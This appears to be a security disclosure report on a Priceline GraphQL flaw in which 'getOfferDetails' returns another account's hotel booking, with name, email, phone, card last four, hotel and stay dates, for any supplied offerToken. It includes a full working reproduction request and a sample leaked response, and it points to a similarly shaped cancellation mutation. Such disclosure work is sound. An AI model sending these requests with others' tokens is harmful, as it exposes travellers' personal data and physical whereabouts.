# OfferBearer: Priceline GraphQL Object-Level Authorization Bypass — Cross-Account Hotel Reservation PII via `offerToken`

## Abstract

The GraphQL operation `getOfferDetails` authorizes solely on the supplied
`offerToken` and never verifies that the token's booking belongs to the
authenticated account. Any authenticated Priceline user can retrieve another
user's hotel reservation — the booking holder's full name, email address,
phone number, partial payment card (type + last four), hotel name and street
address, exact stay dates, and total charges — by supplying that booking's
`offerToken` with their own session. The server enforces authentication but is
missing the object-level authorization check: the token is treated as a bearer
capability.

## Reproduction

Two test accounts, both controlled: Account A holds a hotel booking with
`offerToken = 10b35f83-bab5-4464-8730-91f6cdb867aa`. Account B (a different
account, different `custId`) authenticates and sends A's token as its own:

```http
POST /pws/v0/pcln-graph/?gqlOp=getOfferDetails HTTP/2
Host: www.priceline.com
Authorization: Bearer <ACCOUNT_B_TOKEN>
Cookie: <ACCOUNT_B_COOKIES>
Content-Type: application/json
apollographql-client-name: relax

{"operationName":"getOfferDetails","variables":{"offerToken":"10b35f83-bab5-4464-8730-91f6cdb867aa","appCode":"DESKTOP"},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"6a7cf9e8f9a38d6a06c5acce72bbfd3daa9fdc1738ab20c5953ae56a749e8ced"}}}
```

HTTP 200 returns Account A's booking to Account B:

```json
{"data":{"offerDetails":{"offerDetails":{
  "offerNum":"35715472396",
  "customer":{"firstName":"<A>","lastName":"<A>","emailAddress":"<A email>","phoneList":[{"phoneNumber":"<A phone>"}]},
  "payment":{"creditCard":{"ccNumLastDigits":"6931","ccTypeDesc":"Visa"}},
  "primaryOffer":{"hotel":"Hotel Caza Fisherman's Wharf, 1300 Columbus Ave, San Francisco","checkIn":"2026-06-23","checkOut":"2026-06-27","totalCharges":"1189.64"}}}}}
```

Account B does not own this booking (verified by decoding B's bearer token:
`sub` and `custId` differ from the booking holder's).

## Root Cause

`offerToken` is treated as a bearer capability. The resolver checks that the
caller is authenticated but not that the offerToken's owning account equals
the caller's `custId`.

## Impact

Cross-account disclosure of another user's PII: full name, email, phone
number, hotel + street address, exact future travel dates, and total charges
(card type and last four also returned). This is a privacy exposure
(GDPR/CCPA) with a concrete physical-safety dimension: the response ties a
named individual to a specific hotel and exact check-in/check-out nights.
Knowing precisely where a named person will be staying, and on which nights,
is a stalking and physical-safety exposure beyond ordinary data privacy.

`offerToken` is a UUIDv4 and not brute-forceable, but it appears in
user-facing URLs (`/relax/cancel/{offerToken}`,
`/travel-itinerary/?offertoken={offerToken}`), so it reaches browser history,
server and proxy logs, and shared "view my itinerary" links and emails. Once
the token is held, a single authorized read returns the victim's data.

## Related surface (not tested)

The cancellation flow is keyed on the same offerToken model: the
`doCancelBooking` mutation carries only `{offerToken, cguid, reservationIds}`
with no account/ownership field. Cross-account cancellation is untested (to
avoid affecting a booking) but the write path is shaped identically to the
read path proven above.

## Remediation

Enforce server-side, on `getOfferDetails` and the related cancel-flow
operations, that the offerToken's owning account equals the authenticated
caller's `custId`; return 403 otherwise.

## Credit

nichoc0
